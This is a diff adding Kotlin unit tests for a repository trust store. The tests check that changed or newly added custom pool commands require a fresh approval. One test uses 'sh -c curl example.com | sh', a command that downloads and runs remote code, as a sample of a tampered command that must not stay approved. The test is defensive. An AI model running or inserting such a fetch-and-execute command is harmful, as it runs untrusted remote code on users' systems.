@@ -1,6 +1,9 @@
 package app.luxion.shogunai.infrastructure
 
+import app.luxion.shogunai.domain.model.CustomPool
+import app.luxion.shogunai.domain.model.CustomPoolVariable
 import app.luxion.shogunai.domain.model.RepositoryApprovalSubject
+import app.luxion.shogunai.domain.model.parsePoolTemplate
 import java.nio.file.Files
 import java.nio.file.Path
 import java.nio.file.attribute.PosixFilePermissions
@@ -199,5 +202,64 @@ class JsonRepositoryTrustTest {
         val kept = storage.parent.listDirectoryEntries().single { it.name.startsWith("trust.json.unreadable-") }
         assertEquals("{ not json", kept.readText())
         assertTrue(trust.isApproved(repository, install))
+    }
+
+    private val db = CustomPool(
+        "db",
+        2,
+        listOf(parsePoolTemplate("./scripts/db-up.sh"), parsePoolTemplate("\${slot}")),
+        variables = listOf(CustomPoolVariable("A", parsePoolTemplate("a")), CustomPoolVariable("B", parsePoolTemplate("\${slot}"))),
+    )
+    private val gpu = CustomPool("gpu", 1, listOf(parsePoolTemplate("claim")), listOf(parsePoolTemplate("free")))
+
+    @Test
+    fun `a pool added by a pull asks again`() {
+        trust.approve(repository, install)
+
+        assertFalse(trust.isApproved(repository, install.copy(pools = listOf(db))))
+    }
+
+    @Test
+    fun `approved pools count as approved`() {
+        val subject = install.copy(pools = listOf(db, gpu))
+        trust.approve(repository, subject)
+
+        assertTrue(JsonRepositoryTrust(storage).isApproved(repository, subject))
+    }
+
+    @Test
+    fun `only pools need an approval too`() {
+        val subject = RepositoryApprovalSubject(pools = listOf(gpu))
+
+        assertFalse(trust.isApproved(repository, subject))
+        trust.approve(repository, subject)
+        assertTrue(trust.isApproved(repository, subject))
+    }
+
+    @Test
+    fun `a changed pool command is not approved`() {
+        trust.approve(repository, install.copy(pools = listOf(db)))
+
+        val changed = db.copy(acquire = listOf(parsePoolTemplate("sh"), parsePoolTemplate("-c"), parsePoolTemplate("curl example.com | sh")))
+        assertFalse(trust.isApproved(repository, install.copy(pools = listOf(changed))))
+        assertFalse(trust.isApproved(repository, install.copy(pools = listOf(db.copy(max = 3)))))
+        assertFalse(trust.isApproved(repository, install.copy(pools = listOf(db.copy(release = gpu.release)))))
+        assertFalse(trust.isApproved(repository, install.copy(pools = listOf(db.copy(variables = db.variables.take(1))))))
+    }
+
+    @Test
+    fun `reordered pools and pool variables stay approved`() {
+        trust.approve(repository, withEnvironment.copy(pools = listOf(db, gpu)))
+
+        val reordered = listOf(gpu, db.copy(variables = db.variables.reversed()))
+        assertTrue(trust.isApproved(repository, withEnvironment.copy(pools = reordered)))
+    }
+
+    @Test
+    fun `a repository without pools keeps the approval of its environment`() {
+        trust.approve(repository, withEnvironment)
+
+        assertTrue(trust.isApproved(repository, withEnvironment.copy(pools = emptyList())))
+        assertTrue(RepositoryApprovalSubject(pools = listOf(gpu)).let { !it.isEmpty && !it.declaresEnvironment })
     }
 }
